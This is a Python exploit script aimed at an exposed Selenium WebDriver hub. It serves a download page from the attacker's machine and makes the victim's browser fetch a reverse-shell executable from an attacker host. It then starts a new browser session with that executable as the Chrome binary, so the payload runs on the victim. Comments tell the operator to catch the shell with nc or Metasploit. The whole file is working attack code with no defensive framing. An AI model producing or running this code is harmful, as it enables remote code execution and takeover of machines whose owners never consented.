import socketserver
import threading
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.chrome.options import Options
from http.server import HTTPServer, BaseHTTPRequestHandler

# start nc -l port or use metasploit payload
# Serve Binary: attackers run ( python3 -m http.server 5555 ) in directory with binary

# attacker info
attack_url = '192.168.4.95'
attack_port = '5555'
attack_rev = 'test.exe'
attack_full = f"http://{attack_url}:{attack_port}/{attack_rev}"
attack_dl = f"http://{attack_url}:8000/"

# victim info
vic_url = '192.168.4.102'
vic_port = '4444'
vic_full = f"http://{vic_url}:{vic_port}/wd/hub"

# download path (Where chrome downloads the binary. needs to be writeable)
download_dir = "c:\\temp" # \tmp linux
full_exploit = f"c:\\temp\\{attack_rev}"
download = f"<a href='{attack_full}' id='raw-url'>Download</a>"


class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def _html(self, message):
        """This just generates an HTML document that includes `message`
        in the body. Override, or re-write this do do more interesting stuff.
        """
        content = f"<html><body><h1>{message}</h1></body></html>"
        return content.encode("utf8")  # NOTE: must return a bytes object!

    def do_GET(self):
        self._set_headers()
        self.wfile.write(self._html(download))

    def do_HEAD(self):
        self._set_headers()

    def do_POST(self):
        # Doesn't do anything with posted data
        self._set_headers()
        self.wfile.write(self._html("POST!"))

def run(server_class=HTTPServer, handler_class=S, addr="0.0.0.0", port=8000):
    server_address = (addr, port)
    httpd = server_class(server_address, handler_class)

    print(f"Starting httpd server on {addr}:{port}")
    httpd.serve_forever()

def run_web_background():
    run()

def thread_it():
    # do some stuff
    download_thread = threading.Thread(target=run_web_background)
    download_thread.start()

def selenium_dl_payload():
    # Phase 1 download reverse shell
    chrome_options = webdriver.ChromeOptions()
    preferences = {"download.default_directory": download_dir ,
               	"directory_upgrade": True,
               	"safebrowsing.enabled": True }
    chrome_options.add_experimental_option("prefs", preferences)
    driver = webdriver.Remote(command_executor=vic_full, desired_capabilities=chrome_options.to_capabilities())
    # Selenium flow
    driver.get(attack_dl);
    dl = driver.find_element_by_id("raw-url")
    dl.click()

def exploit():
    # Phase 2 execute reverse shell
    print('Waiting for file to download')
    time.sleep(10)
    print('Check for shell.')
    option = Options()
    option.binary_location = full_exploit
    driver2 = webdriver.Remote(command_executor=vic_full, desired_capabilities=option.to_capabilities())
    driver2.get('http://google.com/')

def main():
    thread_it()
    selenium_dl_payload()
    exploit()


if __name__ == '__main__':
    main()